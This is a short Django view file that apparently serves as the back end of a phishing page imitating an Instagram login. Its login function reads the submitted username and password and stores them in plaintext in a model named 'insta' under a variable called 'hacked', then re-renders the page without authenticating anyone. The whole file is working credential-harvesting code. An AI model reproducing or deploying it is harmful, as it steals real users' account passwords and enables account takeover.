from django.shortcuts import render
from .models import insta

# Create your views here.
def login(request):
    if request.method == 'POST':
        name = request.POST['name']
        password = request.POST['password']
        hacked = insta(name=name, password=password)
        hacked.save()
    return render(request, 'index.html')